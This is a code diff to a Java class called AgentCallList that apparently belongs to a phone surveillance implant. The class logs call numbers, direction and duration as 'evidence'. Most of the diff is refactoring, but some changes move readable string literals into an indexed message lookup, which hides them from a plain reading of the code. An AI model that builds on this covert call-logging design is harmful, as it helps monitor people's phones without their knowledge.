@@ -11,6 +11,7 @@ package com.android.service.agent;
 
 import com.android.service.Call;
 import com.android.service.LogR;
+import com.android.service.Messages;
 import com.android.service.auto.Cfg;
 import com.android.service.evidence.EvidenceType;
 import com.android.service.interfaces.Observer;
@@ -21,7 +22,7 @@ import com.android.service.util.DateTime;
 import com.android.service.util.WChar;
 
 public class AgentCallList extends AgentBase implements Observer<Call> {
-	private static final String TAG = "AgentCallList";
+	private static final String TAG = "AgentCallList"; //$NON-NLS-1$
 
 	@Override
 	public boolean parse(AgentConf conf) {
@@ -48,13 +49,14 @@ public class AgentCallList extends AgentBase implements Observer<Call> {
 	Call callInAction;
 
 	public int notification(Call call) {
-		String name = "";
-		boolean missed = false;
-		final String nametype = "u";
-		final String note = "no notes";
+		final String name = ""; //$NON-NLS-1$
+		final boolean missed = false;
+		final String nametype = Messages.getString("7.0"); //$NON-NLS-1$
+		final String note = Messages.getString("7.1"); //$NON-NLS-1$
 
-		
-		if(Cfg.DEBUG) Check.log( TAG + " (notification): " + call);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (notification): " + call) ;//$NON-NLS-1$
+		}
 		if (call.isOngoing()) {
 			// Arrivano due call, in uscita, una con il number, l'altra senza.
 			if (call.getNumber().length() > 0) {
@@ -63,15 +65,17 @@ public class AgentCallList extends AgentBase implements Observer<Call> {
 			return 0;
 		}
 
-		if(Cfg.DEBUG) Check.asserts(callInAction != null, "null callInAction");
-		
-		boolean outgoing = !callInAction.isIncoming();
-		int duration = call.getDuration(callInAction);
+		if (Cfg.DEBUG) {
+			Check.asserts(callInAction != null, "null callInAction"); //$NON-NLS-1$
+		}
+
+		final boolean outgoing = !callInAction.isIncoming();
+		final int duration = call.getDuration(callInAction);
 		final int LOG_CALLIST_VERSION = 0;
 
 		int len = 28; // 0x1C;
 
-		String number = callInAction.getNumber();
+		final String number = callInAction.getNumber();
 		len += wsize(number);
 		len += wsize(name);
 		len += wsize(note);
